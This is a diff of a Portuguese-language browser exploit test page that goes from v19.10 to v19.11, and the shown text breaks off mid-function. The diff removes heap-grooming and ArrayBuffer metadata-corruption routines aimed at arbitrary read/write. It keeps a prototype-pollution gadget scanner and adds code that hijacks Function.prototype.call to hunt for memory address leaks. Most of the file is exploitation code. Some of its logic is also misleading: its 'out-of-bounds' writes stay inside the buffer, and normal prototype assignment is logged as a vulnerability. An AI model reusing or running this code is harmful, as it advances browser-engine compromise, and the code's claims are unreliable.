@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Suite de Testes Focada em Exploit (v19.10)</title>
+    <title>Suite de Testes Focada em Exploit (v19.11)</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output {
@@ -43,21 +43,22 @@
     </style>
 </head>
 <body>
-    <h1>Suite de Testes Focada em Exploit (v19.10)</h1>
-    <p>Foco: Heap Grooming + OOB Write Metadata, PP Avançada/Gadgets.</p>
-    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.10)</button>
+    <h1>Suite de Testes Focada em Exploit (v19.11)</h1>
+    <p>Foco: PP Avançada/Gadgets, Tentativa de Info Leak via Hijack de Function.call (Análise Refinada).</p>
+    <button id="runBtn" onclick="runExploitFocusedTests()">Iniciar Testes Focados (v19.11)</button>
     <div id="output"></div>
     <hr>
     <div id="summary"></div>
 
     <script>
-        // --- Script Focado em Exploit (v19.10) ---
+        // --- Script Focado em Exploit (v19.11) ---
         const outputDiv = document.getElementById('output');
         const runBtn = document.getElementById('runBtn');
         const SHORT_PAUSE = 50;
         const MEDIUM_PAUSE = 500;
         let findings = []; // Array único para todos os findings
-        let corruptedMetadataBuffer = null; // Armazena buffer corrompido (se encontrado)
+        let ppGadgetsBroken = {}; // Armazena quais gadgets quebraram
+        let potentialLeakFromHijack = null; // Armazena potencial leak do hijack
 
         const IMPORTANT_LOG_TYPES = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];
 
@@ -73,188 +74,168 @@
         const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
         const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
 
-        // --- Testes Prioritários (v19.10) ---
+        // --- Testes Prioritários (v19.11) ---
 
-        // Teste 1: v19.10: Heap Grooming + OOB Write Metadata
-        const testHeapGroomingOOBWrite = async () => {
-            const FNAME = 'testHeapGroomingOOBWrite';
-            log("--- Iniciando Teste 1: Heap Grooming + OOB Write Metadata ---", 'test', FNAME);
-
-            const groomAllocCount = 10000; // Número de alocações para grooming
-            const groomFreeStep = 4;     // Liberar 1 a cada 4 para criar buracos
-            const groomObjectSize = 64;   // Tamanho dos objetos de grooming/espaçadores
-            const targetAllocCount = 500;  // Número de ArrayBuffers alvo
-            const targetObjectSize = 64;   // Tamanho dos ArrayBuffers alvo
-            const controlBufferSize = 64;  // Tamanho base do buffer de controle
-            const controlAllocSize = controlBufferSize + 128; // Alocação real do buffer de controle
-            const controlBaseOffset = 64; // Onde o buffer "começa" dentro da alocação
-            const oobWriteValue = 0x7FFFFFFE; // Valor para corromper byteLength
-            const oobOffsetsToWrite = [8, 12, 16, 24, 32, 48, 64]; // Offsets OOB relativos ao fim do buffer de controle
-            let groomSpacers = [];
-            let targetBuffers = [];
-            let controlBuffer = null;
-            let dv = null;
-            let corruptionSuccess = false;
-            let oobWriteSuccessCount = 0;
-            corruptedMetadataBuffer = null; // Resetar buffer global
-
-            try {
-                // --- 1. Heap Grooming ---
-                log(`Iniciando grooming com ${groomAllocCount} alocações...`, 'info', FNAME);
-                for (let i = 0; i < groomAllocCount; i++) {
-                    groomSpacers.push(new ArrayBuffer(groomObjectSize));
-                }
-                log(`Criando buracos (liberando 1 a cada ${groomFreeStep})...`, 'info', FNAME);
-                for (let i = 0; i < groomAllocCount; i += groomFreeStep) {
-                    groomSpacers[i] = null; // Liberar referência (GC pode coletar)
-                }
-                // Forçar GC é difícil em JS, mas a pausa pode ajudar
-                await PAUSE(MEDIUM_PAUSE);
-                log("Grooming inicial concluído.", 'info', FNAME);
-
-                // --- 2. Alocar Alvos ---
-                log(`Alocando ${targetAllocCount} ArrayBuffers alvo (tamanho ${targetObjectSize})...`, 'info', FNAME);
-                for (let i = 0; i < targetAllocCount; i++) {
-                    try {
-                        targetBuffers.push(new ArrayBuffer(targetObjectSize));
-                    } catch (e) {
-                        log(`Erro ao alocar buffer alvo ${i}: ${e.message}`, 'warn', FNAME);
-                        break;
-                    }
-                }
-                log(`${targetBuffers.length} buffers alvo alocados.`, 'info', FNAME);
-                await PAUSE(SHORT_PAUSE);
-
-                // --- 3. Alocar Buffer de Controle ---
-                log("Alocando buffer de controle...", 'info', FNAME);
-                controlBuffer = new ArrayBuffer(controlAllocSize);
-                dv = new DataView(controlBuffer);
-                for(let i=0; i<controlBuffer.byteLength; i++) dv.setUint8(i, 0xCC); // Padrão CC
-                log("Buffer de controle alocado.", 'info', FNAME);
-                await PAUSE(SHORT_PAUSE);
-
-                // --- 4. Tentar Escrita OOB ---
-                log(`Tentando escrita OOB (${toHex(oobWriteValue)}) em ${oobOffsetsToWrite.length} offsets...`, 'info', FNAME);
-                for (const offset of oobOffsetsToWrite) {
-                    const targetWriteAddr = controlBaseOffset + controlBufferSize + offset;
-                    const relOffsetStr = `ctrlEnd+${offset} (addr ${targetWriteAddr})`;
-                    let currentWriteOK = false;
-                    try {
-                        if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){
-                            dv.setUint32(targetWriteAddr, oobWriteValue, true);
-                            oobWriteSuccessCount++;
-                            currentWriteOK = true;
-                            // Restaurar imediatamente para isolar o efeito (se houver)
-                            try { dv.setUint32(targetWriteAddr, 0xCCCCCCCC, true); } catch(e){}
-                        }
-                    } catch(e) {
-                         log(` -> Escrita OOB U32 FALHOU/Bloqueada em ${relOffsetStr}: ${e.message}`, 'good', `${FNAME}-WriteLoop`);
-                    }
-                    if (currentWriteOK) {
-                         log(` -> Escrita OOB U32 em ${relOffsetStr} parece OK (valor restaurado).`, 'info', `${FNAME}-WriteLoop`);
-                    }
-                    await PAUSE(5); // Pausa entre tentativas de escrita
-                }
-                log(`Tentativas de escrita OOB concluídas (${oobWriteSuccessCount} escritas realizadas).`, 'info', FNAME);
-
-                // --- 5. Verificação ---
-                if (oobWriteSuccessCount > 0) {
-                    log(`Verificando ${targetBuffers.length} buffers alvo por corrupção de byteLength...`, 'info', FNAME);
-                    await PAUSE(MEDIUM_PAUSE); // Pausa antes da verificação
-                    for(let j=0; j<targetBuffers.length; j++){
-                        try {
-                            const currentLength = targetBuffers[j]?.byteLength;
-                            if(currentLength === oobWriteValue){
-                                log(`---> VULN: ArrayBuffer alvo ${j} teve byteLength CORROMPIDO para ${toHex(oobWriteValue)}! <---`, 'critical', FNAME);
-                                log(` ---> *** ALERTA: Primitivo Relevante (Corrupção Metadados OOB Write -> R/W Poderoso) ***`, 'escalation', FNAME);
-                                corruptionSuccess = true;
-                                corruptedMetadataBuffer = targetBuffers[j]; // Armazenar buffer corrompido
-                                log(`   -> Buffer ${j} corrompido ARMAZENADO para teste R/W posterior.`, 'info', FNAME);
-                                // Tentar leitura OOB de confirmação
-                                try{ const corruptedView=new DataView(targetBuffers[j]); const readOOBAddr = targetObjectSize + 4; const readOOBValue = corruptedView.getUint32(readOOBAddr, true); log(`  -> Leitura OOB via AB ${j} corrompido @ offset ${readOOBAddr}: ${toHex(readOOBValue)}`, 'leak', FNAME); log(` ---> *** ALERTA: Leitura OOB confirmada usando buffer corrompido! ***`, 'escalation', FNAME); }catch(eRead){ log(`  -> Erro ao tentar leitura OOB via AB ${j} corrompido: ${eRead.message}`, 'warn', FNAME); }
-                                break; // Parar se encontrar um
-                            }
-                        } catch(eCheck) { /* Ignorar erros de verificação individuais */ }
-                    }
-                } else {
-                    log("Nenhuma escrita OOB foi realizada, verificação de corrupção pulada.", 'warn', FNAME);
-                }
-
-            } catch (e) {
-                log(`Erro fatal no Teste 1: ${e.message}`, 'error', FNAME);
-                console.error(e);
-            } finally {
-                // Limpar referências
-                groomSpacers = [];
-                targetBuffers = [];
-                controlBuffer = null;
-                dv = null;
-                const resultMsg = corruptionSuccess ? `SUCESSO! byteLength corrompido.` : `Nenhuma corrupção de byteLength detectada.`;
-                log(resultMsg, corruptionSuccess ? 'vuln' : (oobWriteSuccessCount > 0 ? 'warn' : 'good'), FNAME);
-                log(`--- Teste 1 Concluído (Corrupção Metadata: ${corruptionSuccess ? 'Sim' : 'Não'}) ---`, 'test', FNAME);
-            }
-            return corruptionSuccess;
-        };
-
-        // Teste 2: Tentar usar o buffer corrompido (Inalterado v19.3 - Renumerado)
-        const testArbitraryRW = async () => {
-            const FNAME = 'testArbitraryRW';
-            log("--- Iniciando Teste 2: Tentativa de R/W Arbitrário ---", 'test', FNAME);
-            if (!corruptedMetadataBuffer) { log("Nenhum buffer corrompido encontrado no Teste 1. Pulando.", 'good', FNAME); log("--- Teste 2 Concluído (Pulado) ---", 'test', FNAME); return; }
-            log(`Buffer corrompido encontrado! Tentando R/W arbitrário...`, 'info', FNAME);
-            const originalSize = 64; // Tamanho original do buffer alvo
-            try {
-                const corruptedView = new DataView(corruptedMetadataBuffer);
-                const arbitraryReadOffset = originalSize + 100; const arbitraryWriteOffset = originalSize + 200; const writeVal = 0xBADCAFE0;
-                try { const readValue = corruptedView.getUint32(arbitraryReadOffset, true); log(` -> LEITURA ARBITRÁRIA OK @ offset ${arbitraryReadOffset}: ${toHex(readValue)}`, 'leak', FNAME); log(` ---> *** ALERTA: Primitiva Arbitrary Read CONFIRMADA! ***`, 'escalation', FNAME); } catch (eReadArb) { log(` -> FALHA Leitura Arbitrária @ offset ${arbitraryReadOffset}: ${eReadArb.message}`, 'error', FNAME); }
-                await PAUSE(SHORT_PAUSE);
-                try { corruptedView.setUint32(arbitraryWriteOffset, writeVal, true); log(` -> ESCRITA ARBITRÁRIA OK @ offset ${arbitraryWriteOffset} (valor ${toHex(writeVal)})`, 'vuln', FNAME); try { const readBack = corruptedView.getUint32(arbitraryWriteOffset, true); if (readBack === writeVal) { log(` -> Confirmação R/W Arbitrário: Leu ${toHex(readBack)} de volta.`, 'vuln', FNAME); log(` ---> *** ALERTA: Primitiva Arbitrary Read/Write CONFIRMADA! ***`, 'escalation', FNAME); } else { log(` -> FALHA Confirmação R/W Arbitrário: Leu ${toHex(readBack)} != ${toHex(writeVal)}`, 'warn', FNAME); } } catch(eReadBack) { log(` -> FALHA Leitura para Confirmação R/W Arbitrário: ${eReadBack.message}`, 'error', FNAME); } } catch (eWriteArb) { log(` -> FALHA Escrita Arbitrária @ offset ${arbitraryWriteOffset}: ${eWriteArb.message}`, 'error', FNAME); }
-            } catch (eUseCorrupted) { log(` -> Erro GERAL ao tentar usar buffer corrompido: ${eUseCorrupted.message}`, 'error', FNAME); }
-            log("--- Teste 2 Concluído ---", 'test', FNAME);
-            await PAUSE();
-        };
-
-
-        // Teste 3: PP Avançada / Gadgets (Inalterado v19.0 - Renumerado)
+        // Teste 1: PP Avançada / Gadgets (v19.7 - Armazena estado)
         const testAdvancedPP = async () => {
             const FNAME = 'testAdvancedPP';
-            log("--- Iniciando Teste 3: PP Avançado (Gadgets++) ---", 'test', FNAME);
-            const propsToPollute = [ /* ... Lista completa ... */ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => { try{({}).hasOwnProperty('a'); return null;} catch(e){ return `Object.hasOwnProperty quebrou! ${e.message}`;} } }, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') }, { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ return `Node.appendChild quebrou! ${e.message}`;} } }, { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ return `EventTarget.addEventListener quebrou! ${e.message}`;} } }, { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null }, { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].filter(()=>{}); return null;} catch(e){ return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].forEach(()=>{}); return null;} catch(e){ return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'join', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[1,2].join(); return null;} catch(e){ return `Array.join quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} }, { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} }, ];
+            log("--- Iniciando Teste 1: PP Avançado (Gadgets++) ---", 'test', FNAME);
+            ppGadgetsBroken = {}; // Limpar estado anterior
+            const propsToPollute = [ /* ... Lista completa de propsToPollute ... */ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => { try{({}).hasOwnProperty('a'); return null;} catch(e){ return `Object.hasOwnProperty quebrou! ${e.message}`;} } }, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') }, { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ return `Node.appendChild quebrou! ${e.message}`;} } }, { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ return `EventTarget.addEventListener quebrou! ${e.message}`;} } }, { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null }, { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].filter(()=>{}); return null;} catch(e){ return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].forEach(()=>{}); return null;} catch(e){ return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'join', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[1,2].join(); return null;} catch(e){ return `Array.join quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} }, { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} }, ];
             const testValue = "PP_Adv_Polluted_" + Date.now();
             let successCount = 0; let gadgetCount = 0; let gadgetMessages = [];
-            for (const item of propsToPollute) { if (!item.proto) { continue; } const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } catch (e) { log(`AVISO: Erro check/get original ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME); continue; } try { targetProto[prop] = testValue; let obj; if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } } else { obj = {}; } let inheritedValue = undefined; try { inheritedValue = obj[prop]; } catch (e) {} if (inheritedValue === testValue) { log(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { try { gadgetMsg = item.gadgetCheck(obj, testValue); } catch(e){} if (gadgetMsg) { log(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); gadgetMessages.push(prop + ": " + gadgetMsg); gadgetCount++; if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) { log(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { log(`-> FAIL: Herança de '__proto__' não OK (Esperado).`, 'good', FNAME); } } } catch (e) { log(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { let cleanupOK = true; if (wasDefined) { targetProto[prop] = originalValue; try { if (targetProto[prop] !== originalValue) cleanupOK = false; } catch(e){ cleanupOK = false; } } else { delete targetProto[prop]; if (Object.prototype.hasOwnProperty.call(targetProto, prop)) cleanupOK = false; } if (!cleanupOK) { log(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}! Estado pode estar inconsistente. <---`, 'critical', FNAME); } } catch (e) { log(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME); } } await PAUSE(15); }
-            log(`--- Teste 3 Concluído (${successCount} OK, ${gadgetCount} gadgets encontrados) ---`, 'test', FNAME);
+            for (const item of propsToPollute) { if (!item.proto) { continue; } const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } catch (e) { log(`AVISO: Erro check/get original ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME); continue; } try { targetProto[prop] = testValue; let obj; if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } } else { obj = {}; } let inheritedValue = undefined; try { inheritedValue = obj[prop]; } catch (e) {} if (inheritedValue === testValue) { log(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { try { gadgetMsg = item.gadgetCheck(obj, testValue); } catch(e){} if (gadgetMsg) { log(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); gadgetMessages.push(prop + ": " + gadgetMsg); gadgetCount++; ppGadgetsBroken[`${targetProtoName}.${prop}`] = true; if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) { log(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { log(`-> FAIL: Herança de '__proto__' não OK (Esperado).`, 'good', FNAME); } } } catch (e) { log(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { let cleanupOK = true; if (wasDefined) { targetProto[prop] = originalValue; try { if (targetProto[prop] !== originalValue) cleanupOK = false; } catch(e){ cleanupOK = false; } } else { delete targetProto[prop]; if (Object.prototype.hasOwnProperty.call(targetProto, prop)) cleanupOK = false; } if (!cleanupOK) { log(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}! Estado pode estar inconsistente. <---`, 'critical', FNAME); } } catch (e) { log(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME); } } await PAUSE(15); }
+            log(`--- Teste 1 Concluído (${successCount} OK, ${gadgetCount} gadgets encontrados) ---`, 'test', FNAME);
             if (gadgetCount > 0) { log(`Gadgets detectados: ${gadgetMessages.join('; ')}`, 'critical', FNAME); }
             await PAUSE();
         };
 
-        // --- Função Principal de Execução (v19.10) ---
+        // Teste 2: v19.11: Tentativa de Info Leak via Hijack de Function.call (Análise Refinada)
+        const testPPGadgetLeakAttempt = async () => {
+            const FNAME = 'testPPGadgetLeakAttempt';
+            log("--- Iniciando Teste 2: Tentativa de Info Leak via Hijack (Function.call - Análise Refinada) ---", 'test', FNAME);
+            potentialLeakFromHijack = null; // Resetar leak
+            let leakFound = false; // Flag local
+
+            // Verificar se o gadget 'call' foi detectado como quebrado no teste anterior
+            if (!ppGadgetsBroken['Function.call']) {
+                log("Gadget Function.call não foi detectado como quebrado no Teste 1. Pulando exploração.", 'good', FNAME);
+                log("--- Teste 2 Concluído (Pulado) ---", 'test', FNAME);
+                return;
+            }
+
+            const originalCall = Function.prototype.call; // Salvar original
+            let hijackExecutedCount = 0;
+            const maxLogs = 15; // Logar mais chamadas
+
+            // Lista de padrões numéricos a ignorar (unsigned 32-bit)
+            const ignoredPatterns = new Set([
+                0xAAAAAAAA, 0xAAAAAAEE, 0xBBBBBBBB, 0xBBBBBBEE,
+                0xCCCCCCCC, 0xCCCCCCCC, 0xDDDDDDDD, 0xDDDDDDEE,
+                0xFFFFFFFF, 0x00000000
+            ]);
+
+            // Função auxiliar para análise de objetos (recursiva com limite de profundidade)
+            const checkObjectForLeak = (obj, prefix = '', depth = 0) => {
+                if (leakFound || !obj || typeof obj !== 'object' || depth > 2) return; // Limitar profundidade
+
+                for (const key in obj) {
+                    if (!Object.prototype.hasOwnProperty.call(obj, key)) continue;
+                    // Evitar propriedades que podem causar problemas ou recursão excessiva
+                    if (['__proto__', 'constructor', 'prototype', 'parentNode', 'ownerDocument', 'window', 'document', 'self'].includes(key)) continue;
+
+                    try {
+                        const value = obj[key];
+                        if (typeof value === 'number' && value > 0x10000 && isFinite(value) && !ignoredPatterns.has(value >>> 0)) {
+                             log(`  -> ${prefix}${key}: Potential numeric leak? ${toHex(value)} (Dec: ${value})`, 'leak', FNAME);
+                             potentialLeakFromHijack = value; // Armazena o último encontrado
+                             leakFound = true; // Encontrou um potencial leak
+                             // Poderia parar aqui se quisesse apenas o primeiro: return;
+                        } else if (typeof value === 'object' && value !== null && !Array.isArray(value)) { // Evitar recursão em arrays grandes
+                             checkObjectForLeak(value, `${prefix}${key}.`, depth + 1);
+                        }
+                    } catch(e) { /* Ignorar erros ao acessar propriedades internas/complexas */ }
+                     if (leakFound) return; // Otimização: parar se já achou um leak nesta chamada
+                }
+            };
+
+
+            try {
+                // Definir nossa função maliciosa/de análise
+                const hijackedCallFunction = function(thisArg, ...args) {
+                    hijackExecutedCount++;
+                    if (hijackExecutedCount <= maxLogs || leakFound) { // Logar mais ou se achar um leak
+                        log(`===> Function.call SEQUESTRADO! Chamada #${hijackExecutedCount} <===`, 'vuln', FNAME);
+                        try {
+                            let thisStr = '[Não foi possível analisar this]'; let thisType = typeof this;
+                            try { thisStr = this.toString().substring(0, 80) + (this.toString().length > 80 ? '...' : ''); thisType = Object.prototype.toString.call(this); } catch(e){}
+                            log(` -> 'this' (Tipo: ${thisType}): ${thisStr}`, 'info', FNAME);
+
+                            let thisArgStr = '[Não foi possível analisar thisArg]'; let thisArgType = typeof thisArg;
+                            try { thisArgType = Object.prototype.toString.call(thisArg); thisArgStr = String(thisArg).substring(0, 80) + (String(thisArg).length > 80 ? '...' : '');} catch(e){}
+                            log(` -> 'thisArg' (Tipo: ${thisArgType}): ${thisArgStr}`, 'info', FNAME);
+
+                            if (args && args.length > 0) { log(` -> Outros Args (${args.length}): [${args.map(a => typeof a).join(', ')}]`, 'info', FNAME); }
+
+                            // --- Tentar encontrar leaks (Análise Refinada) ---
+                            if (!leakFound) checkObjectForLeak(this, "'this'.");
+                            if (!leakFound) checkObjectForLeak(thisArg, "'thisArg'.");
+                            if (!leakFound && args) {
+                                args.forEach((arg, index) => {
+                                    if (!leakFound) checkObjectForLeak(arg, `'args[${index}]'.`);
+                                });
+                            }
+
+                        } catch (e) { log(` -> Erro dentro da função sequestrada 'call': ${e.message}`, 'error', FNAME); }
+                    }
+                    // Chamar a função original
+                    try {
+                         return originalCall.apply(this, [thisArg, ...args]);
+                    } catch(e) {
+                         if (hijackExecutedCount <= maxLogs) log(` -> Erro ao chamar originalCall.apply: ${e.message}`, 'warn', FNAME);
+                         return undefined;
+                    }
+                };
+
+                log("Poluindo Function.prototype.call com função controlada...", 'info', FNAME);
+                Function.prototype.call = hijackedCallFunction;
+
+                log("Chamando (()=>{}).call(null)...", 'info', FNAME);
+                try { const dummyFunc = () => {}; dummyFunc.call(null); log(` -> Chamada explícita para call concluída.`, 'good', FNAME); } catch (e) { log(` -> Erro ao chamar call sequestrado explicitamente: ${e.message}`, 'error', FNAME); }
+
+                log("Forçando algumas operações internas (podem usar .call)...", 'info', FNAME);
+                try { [1,2,3].forEach(x => x+1); } catch(e){}
+                try { document.body.appendChild(document.createElement('hr')); } catch(e){} // Usar appendChild que também pode ser interceptado
+                try { Object.prototype.hasOwnProperty.call({}, 'a'); } catch(e) {} // Usar hasOwnProperty
+
+                await PAUSE(MEDIUM_PAUSE); // Dar tempo para chamadas internas ocorrerem
+
+            } catch (e) { log(`Erro fatal durante Teste 2: ${e.message}`, 'error', FNAME); console.error(e); }
